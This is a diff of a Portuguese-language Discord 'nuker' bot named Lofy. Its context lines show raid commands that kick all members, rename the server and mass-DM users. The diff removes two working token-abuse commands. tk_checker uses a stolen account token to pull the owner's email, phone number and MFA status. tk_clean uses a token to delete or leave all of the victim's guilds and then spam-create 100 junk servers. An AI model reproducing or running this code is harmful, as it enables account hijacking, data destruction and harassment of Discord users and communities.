@@ -63,16 +63,17 @@ client.on("ready", () => {
     
 
 
-    ██╗      ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗
-    ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝    
-    ██║     ██║   ██║█████╗   ╚████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗      
-    ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  
-    ███████╗╚██████╔╝██║        ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗    
-    ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ 
+
+       ██╗      ██████╗ ███████╗██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
+       ██║     ██╔═══██╗██╔════╝╚██╗ ██╔╝    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
+       ██║     ██║   ██║█████╗   ╚████╔╝     ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
+       ██║     ██║   ██║██╔══╝    ╚██╔╝      ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
+       ███████╗╚██████╔╝██║        ██║       ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
+       ╚══════╝ ╚═════╝ ╚═╝        ╚═╝       ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                   
                                            
                                                                                                                                                                                 
-          `.america
+          `.rainbow
   );
 
   console.log(
@@ -85,7 +86,7 @@ client.on("ready", () => {
   console.log(greenBright(`    Permissão Necessária > ADMINISTRATOR`));
 
   console.log(
-    greenBright(`    Estou em ${client.guilds.cache.size} servidores`)
+    greenBright(`\n    Estou em ${client.guilds.cache.size} servidores`)
   );
   console.log(greenBright(`    Encontrei ${client.users.cache.size} usuarios`));
   console.log("");
@@ -121,9 +122,6 @@ client.on("message", async message => {
                     **${emoji_menu} Expulsa todas as pessoas:** \`${prefix}chute\`
                     **${emoji_menu} Muda o nome do servidor:** \`${prefix}visual\`
                     **${emoji_menu} Envia mensagem para todos no pv:** \`${prefix}dmall\`
-
-                    **${emoji_menu} Verifica um token:** \`${prefix}tk_checker\`
-                    **${emoji_menu} Limpa uma conta:** \`${prefix}tk_clean\`
                     `
           )
           .setImage(
@@ -152,193 +150,6 @@ client.on("message", async message => {
       console.log("    [Lofy] Mudando icone & nome do servidor".green);
       message.guild.setName(`${nome_do_servidor}`);
       message.guild.setIcon(icone_do_servidor);
-    }
-
-    /// Checker de token
-
-    if (!message.content.startsWith(prefix)) return;
-
-    if (message.author.id != myID) {
-      console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
-      return message.reply("Você não pode utilizar este comando!");
-    }
-
-    const args = message.content
-      .slice(prefix.length)
-      .trim()
-      .split(/ +/g);
-    const command = args.shift().toLowerCase();
-    if (command == "tk_checker") {
-      const filtro = m => m.author.id === message.author.id;
-      message.channel.send(
-        new Discord.MessageEmbed()
-        .setDescription("[:warning:]-Envie o token a baixo desta mensagem")
-        .setColor("RED")
-      );
-      message.channel
-        .awaitMessages(filtro, {
-          max: 1,
-          time: 20000,
-          errors: ["time"]
-        })
-        .then(coleccion => {
-          const token = coleccion.first();
-          const tkn = token.content;
-          const headers = {
-            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
-            "Content-Type": "application/json",
-            Authorization: tkn
-          };
-
-          axios({
-              method: "GET",
-              url: "https://discordapp.com/api/v8/users/@me",
-              headers: headers
-            })
-            .then(res => {
-              if (res.statusText == "OK") {
-                let Nitro;
-                let Numero;
-                let MFA;
-                let NSFW;
-                let Verificado;
-                if (res.data.premium_type == 1) {
-                  Nitro = "Nitro Classic";
-                } else if (res.data.premium_type == 2) {
-                  Nitro = "Nitro Boost";
-                } else {
-                  Nitro = "Não tem nitro";
-                }
-                if (res.data.phone) {
-                  Numero = res.data.phone;
-                } else if (res.data.phone == null) {
-                  Numero = "Não tem numero vinculado.";
-                }
-                if (res.data.mfa_enabled == true) {
-                  MFA = "Sim, esta ativado.";
-                } else if (res.data.mfa_enabled == false) {
-                  MFA = "Não esta ativado.";
-                }
-                if (res.data.verified == true) {
-                  Verificado = "Esta Verificado.";
-                } else if (res.data.verified == false) {
-                  Verificado = "Não esta verificado.";
-                }
-                message.channel.send(
-                  new Discord.MessageEmbed()
-                  .setAuthor(
-                    message.author.tag,
-                    message.author.avatarURL({
-                      dynamic: true
-                    })
-                  )
-                  .addField(
-                    "👤 - Usuario",
-                    res.data.username + "#" + res.data.discriminator,
-                    true
-                  )
-                  .addField("🆔 - ID", res.data.id, false)
-                  .addField("🎫 - MFA Ativada?", MFA, false)
-                  .addField("💳 - Tem Nitro?", Nitro, false)
-                  .addField("📩 - E-mail", res.data.email, false)
-                  .addField("✅ - E-mail Verificado?", Verificado, false)
-                  .addField("🌍 - Linguagem", res.data.locale, false)
-                  .addField("📱 - Telefone Vinculado?", Numero, false)
-                  .setColor("GREEN")
-                  .setFooter(`Pedido por: ${message.author.tag}`)
-                  .setTimestamp()
-                );
-              } else {
-                message.channel.send("[:warning:]-Token Invalido");
-              }
-            })
-            .catch(err => {
-              message.channel.send("[:warning:]-Ocorreu um erro");
-            });
-        })
-        .catch(err => {
-          message.channel.send("[:warning:]-Não encontrei nenhum token");
-        });
-    }
-
-    /// Sla limpa o token de 4
-
-    if (command == "tk_clean") {
-      if (message.author.id != myID) {
-        console.log(`    [Lofy] Um idiota tentou utilizando um comando`.white);
-        return message.reply("Você não pode utilizar este comando!");
-      }
-
-      const filtro = m => m.author.id === message.author.id;
-      message.channel.send(
-        new Discord.MessageEmbed()
-        .setDescription("[:warning:]-Envie o token a baixo desta mensagem")
-        .setColor("RED")
-      );
-
-      message.channel
-        .awaitMessages(filtro, {
-          max: 1,
-          time: 20000,
-          errors: ["time"]
-        })
-        .then(coleccion => {
-          const token = coleccion.first();
-
-          const tkn = token.content;
-
-          message.channel.send("[💤]-Derrubando...");
-          const headers = {
-            "User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
-            "Content-Type": "application/json",
-            Authorization: tkn
-          };
-          const guild = {
-            icon: "",
-            name: "Tu cuenta fue nukeada",
-            region: "us-west"
-          };
-          const limit = {
-            limit: 100
-          };
-
-          axios({
-              method: "GET",
-              url: "https://discordapp.com/api/v6/users/@me/guilds",
-              headers: headers
-            })
-            .then(res => {
-              for (let i = 0; i < res.data.length; i++) {
-                console.log(res.data[i]);
-                axios({
-                  method: "delete",
-                  url: `https://discordapp.com/api/v6/guilds/` + res.data[i].id,
-                  headers: headers,
-                  data: limit
-                });
-                axios({
-                  method: "delete",
-                  url: `https://discordapp.com/api/v6/users/@me/guilds/` +
-                    res.data[i].id,
-                  headers: headers,
-                  data: limit
-                }).then(res => {
-                  for (let i = 0; i < 100; i++) {
-                    axios({
-                      method: "POST",
-                      url: "https://discordapp.com/api/v6/guilds",
-                      data: guild,
-                      headers: headers
-                    }).then(res => {});
-                  }
-                });
-              }
-            })
-            .then(message.channel.send("[✅] Conta limpada"));
-        })
-        .catch(err => {
-          console.log(err);
-        });
     }
 
     /// Cria canais
